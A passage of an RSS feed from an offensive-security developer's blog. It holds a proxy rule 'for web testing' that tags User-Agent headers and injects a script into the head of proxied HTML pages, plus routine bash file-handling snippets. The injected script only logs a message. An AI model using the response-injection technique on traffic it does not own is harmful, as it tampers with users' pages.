&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;error&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;e&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;});&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nx"&gt;proxyServer&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;start&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;//when finished
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-js" data-lang="js"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;// dfkt_rule
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;span class="kd"&gt;let&lt;/span&gt; &lt;span class="nx"&gt;hooks&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nx"&gt;beforeSendRequest&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;requestDetail&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;requestDetailModifications&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nx"&gt;requestDetailModifications&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;requestOptions&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;requestDetail&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;requestOptions&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nx"&gt;requestDetailModifications&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;requestOptions&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;headers&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;User-Agent&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39; DFKT/1&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;},&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;],&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nx"&gt;beforeSendResponse&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;requestDetail&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;responseDetail&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;modifiedResponse&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nx"&gt;modifiedResponse&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;response&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;responseDetail&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;response&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;modifiedResponse&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;response&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;header&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;modifiedResponse&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;response&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;body&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;indexOf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&amp;lt;head&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;!==&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nx"&gt;modifiedResponse&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;response&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;body&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;modifiedResponse&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;response&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;body&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;toString&lt;/span&gt;&lt;span class="p"&gt;().&lt;/span&gt;&lt;span class="nx"&gt;replace&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&amp;lt;head&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;lt;head&amp;gt;&amp;lt;script&amp;gt;console.log(&amp;#34;dfkt loaded&amp;#34;)&amp;lt;/script&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;},&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;],&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nx"&gt;module&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;exports&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nx"&gt;summary&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;DFKT rules for web testing&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="nx"&gt;beforeSendRequest&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;requestDetail&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="kd"&gt;let&lt;/span&gt; &lt;span class="nx"&gt;requestDetailModifications&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{};&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kd"&gt;let&lt;/span&gt; &lt;span class="nx"&gt;hook&lt;/span&gt; &lt;span class="k"&gt;in&lt;/span&gt; &lt;span class="nx"&gt;hooks&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;beforeSendRequest&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nx"&gt;hooks&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;beforeSendRequest&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;hook&lt;/span&gt;&lt;span class="p"&gt;](&lt;/span&gt;&lt;span class="nx"&gt;requestDetail&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;requestDetailModifications&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nx"&gt;requestDetailModifications&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;},&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="c1"&gt;// deal response before send to client
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="nx"&gt;beforeSendResponse&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;requestDetail&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;responseDetail&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="kd"&gt;let&lt;/span&gt; &lt;span class="nx"&gt;responseDetailModifications&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{};&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kd"&gt;let&lt;/span&gt; &lt;span class="nx"&gt;hook&lt;/span&gt; &lt;span class="k"&gt;in&lt;/span&gt; &lt;span class="nx"&gt;hooks&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;beforeSendResponse&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nx"&gt;hooks&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;beforeSendResponse&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;hook&lt;/span&gt;&lt;span class="p"&gt;](&lt;/span&gt;&lt;span class="nx"&gt;requestDetail&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;responseDetail&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;responseDetailModifications&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nx"&gt;responseDetailModifications&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;},&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="c1"&gt;// // if deal https request
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;&lt;/span&gt; &lt;span class="c1"&gt;// *beforeDealHttpsRequest(requestDetail) {
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;&lt;/span&gt; &lt;span class="c1"&gt;//
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;&lt;/span&gt; &lt;span class="c1"&gt;// },
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;&lt;/span&gt; &lt;span class="c1"&gt;// error happened when dealing requests
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="nx"&gt;onError&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;requestDetail&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;error&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;},&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="c1"&gt;// error happened when connect to https server
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="nx"&gt;onConnectError&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;requestDetail&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;error&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;};&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description></item><item><title>Random shell scripting things I may use in the future</title><link>https://defektive.github.io/blog/2019/03/01/random-shell-scripting-things-i-may-use-in-the-future/</link><pubDate>Fri, 01 Mar 2019 16:20:01 +0000</pubDate><guid>https://defektive.github.io/blog/2019/03/01/random-shell-scripting-things-i-may-use-in-the-future/</guid><description>&lt;p&gt;Mass move:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="k"&gt;for&lt;/span&gt; f in wlog/*&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;for&lt;/span&gt; ff in &lt;span class="nv"&gt;$f&lt;/span&gt;/*&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; cp &lt;span class="s2"&gt;&amp;#34;&lt;/span&gt;&lt;span class="nv"&gt;$ff&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;&lt;/span&gt; &lt;span class="k"&gt;$(&lt;/span&gt;basename &lt;span class="nv"&gt;$f&lt;/span&gt;&lt;span class="k"&gt;)&lt;/span&gt;-&lt;span class="k"&gt;$(&lt;/span&gt;basename &lt;span class="nv"&gt;$ff&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; sed &lt;span class="s1"&gt;&amp;#39;s/^00-//g&amp;#39;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; sed &lt;span class="s1"&gt;&amp;#39;s/ /-/g&amp;#39;&lt;/span&gt;&lt;span class="k"&gt;)&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;done&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="k"&gt;done&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Mass Find and replace:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="k"&gt;for&lt;/span&gt; f in *todo*&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; cat &lt;span class="nv"&gt;$f&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; sed -e &lt;span class="s1"&gt;&amp;#39;s/## &amp;#39;&lt;/span&gt;&lt;span class="k"&gt;$(&lt;/span&gt;basename &lt;span class="nv"&gt;$f&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; sed &lt;span class="s1"&gt;&amp;#39;s/-stand-up-notes.md//&amp;#39;&lt;/span&gt;&lt;span class="k"&gt;)&lt;/span&gt;&lt;span class="s1"&gt;$&amp;#39;/---\\\ndate: &amp;#34;2019-03-01T16:20:01&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="s1"&gt;title: &amp;#39;&lt;/span&gt;&lt;span class="k"&gt;$(&lt;/span&gt;basename &lt;span class="nv"&gt;$f&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; sed &lt;span class="s1"&gt;&amp;#39;s/-stand-up-notes.md//&amp;#39;&lt;/span&gt;&lt;span class="k"&gt;)&lt;/span&gt;&lt;span class="s1"&gt;$&amp;#39; stand up notes\\\n---&amp;#39;&lt;/span&gt;/ &lt;span class="p"&gt;|&lt;/span&gt; tee &lt;span class="nv"&gt;$f&lt;/span&gt; &lt;span class="p"&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="k"&gt;done&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Mass adjust markdown headers:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;find . -name &lt;span class="s1"&gt;&amp;#39;*.md&amp;#39;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="nb"&gt;read&lt;/span&gt; f&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt; cat &lt;span class="nv"&gt;$f&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; egrep &lt;span class="s1"&gt;&amp;#39;^##\s&amp;#39;&lt;/span&gt; &amp;gt; /dev/null &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="nv"&gt;$f&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;done&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="nb"&gt;read&lt;/span&gt; fn&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt; cat &lt;span class="nv"&gt;$fn&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; sed &lt;span class="s1"&gt;&amp;#39;s/^##/###/g&amp;#39;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; sed &lt;span class="s1"&gt;&amp;#39;s/^#\s/## /g&amp;#39;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; tee &lt;span class="nv"&gt;$fn&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;done&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Create temp directory:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nv"&gt;tmpDir&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;&lt;/span&gt;&lt;span class="k"&gt;$(&lt;/span&gt;mktemp -d -t tmpdirname.XXXXXXXXXX &lt;span class="o"&gt;||&lt;/span&gt; oops &lt;span class="s2"&gt;&amp;#34;Can&amp;#39;t create temporary directory&amp;#34;&lt;/span&gt;&lt;span class="k"&gt;)&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;cleanup&lt;span class="o"&gt;()&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; rm -rf &lt;span class="s2"&gt;&amp;#34;&lt;/span&gt;&lt;span class="nv"&gt;$tmpDir&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nb"&gt;trap&lt;/span&gt; cleanup EXIT INT QUIT TERM
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description></item><item><title>About Defektive</title><link>https://defektive.github.io/about/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://defektive.github.io/about/</guid><description>&lt;link rel="preload" as="image" href="https://defektive.github.io/about/featured-background_hu_c82dba240c8ea58e.png" media="(max-width: 1200px)"&gt;
&lt;link rel="preload" as="image" href="https://defektive.github.io/about/featured-background_hu_8c0c8ad298909def.png" media="(min-width: 1200px)"&gt;
&lt;style&gt;
#td-cover-block-0 {
 background-image: url(/about/featured-background_hu_c82dba240c8ea58e.png);
}
@media only screen and (min-width: 1200px) {
 #td-cover-block-0 {
 background-image: url(/about/featured-background_hu_8c0c8ad298909def.png);
 }
}
&lt;/style&gt;
&lt;section id="td-cover-block-0" class="row td-cover-block td-cover-block--height-auto js-td-cover td-overlay td-overlay--dark -bg-dark"&gt;
 &lt;div class="col-12"&gt;
 &lt;div class="container td-overlay__inner"&gt;
 &lt;div class="text-center"&gt;
 &lt;h1 class="display-1 mt-0 mt-md-5 pb-4"&gt;About Me&lt;/h1&gt;
 
 &lt;div class="pt-3 lead"&gt;
 
 &lt;h2 id="offensive-security--developer"&gt;Offensive Security / Developer&lt;a class="td-heading-self-link" href="#offensive-security--developer" aria-label="Heading self-link"&gt;&lt;/a&gt;&lt;/h2&gt;
 
 &lt;/div&gt;
 &lt;/div&gt;
 &lt;/div&gt;
 &lt;/div&gt;
 
&lt;/section&gt;

&lt;div&gt;&lt;a id="td-block-1" class="td-offset-anchor"&gt;&lt;/a&gt;&lt;/div&gt;
&lt;section class="row td-box td-box--1 position-relative td-box--height-auto"&gt;
&lt;div class="col-12"&gt;
&lt;div class="container text-center td-arrow-down"&gt;
&lt;div class="h4 mb-0"&gt;
&lt;p&gt;Twenty years ago I began learning to program in order to learn how to break programs. I have been building and breaking ever since. I love learning new things, writing code, and sharing my passion for security. This makes finding and exploiting software vulnerabilities extremely rewarding for me. I take pride in clean code, even if it is exploit code.&lt;/p&gt;</description></item><item><title>Search Results</title><link>https://defektive.github.io/search/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://defektive.github.io/search/</guid><description/></item></channel></rss>